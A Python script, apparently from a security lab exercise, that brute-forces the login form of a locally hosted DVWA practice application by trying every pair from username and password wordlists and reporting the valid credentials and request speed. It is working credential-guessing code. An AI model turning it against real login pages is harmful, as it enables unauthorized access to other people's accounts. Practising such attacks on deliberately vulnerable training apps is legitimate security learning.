from itertools import product
from pathlib import Path
from time import perf_counter
import os

import requests


URL = "http://127.0.0.1:4280/vulnerabilities/brute/"

# PHPSESSID se entrega desde la terminal para no dejar
# una sesión específica escrita dentro del programa.
PHPSESSID = os.environ["DVWA_PHPSESSID"]

BASE = Path(__file__).resolve().parents[1]

usuarios = [
    linea.strip()
    for linea in (BASE / "diccionarios" / "usuarios.txt").read_text().splitlines()
    if linea.strip()
]

passwords = [
    linea.strip()
    for linea in (BASE / "diccionarios" / "passwords.txt").read_text().splitlines()
    if linea.strip()
]

headers = {
    "Cookie": f"security=low; PHPSESSID={PHPSESSID}"
}

intentos = 0
validas = []

inicio = perf_counter()

with requests.Session() as sesion:
    print(f"User-Agent: {sesion.headers['User-Agent']}")
    print()

    for usuario, password in product(usuarios, passwords):
        intentos += 1

        parametros = {
            "username": usuario,
            "password": password,
            "Login": "Login"
        }

        respuesta = sesion.get(
            URL,
            params=parametros,
            headers=headers,
            timeout=5
        )

        if "Welcome to the password protected area" in respuesta.text:
            print(f"[+] Credencial valida: {usuario}:{password}")
            validas.append((usuario, password))

fin = perf_counter()

tiempo = fin - inicio

print()
print(f"Intentos realizados: {intentos}")
print(f"Tiempo total: {tiempo:.3f} segundos")

if tiempo > 0:
    print(f"Velocidad: {intentos / tiempo:.2f} solicitudes/s")

print(f"Credenciales validas encontradas: {len(validas)}")
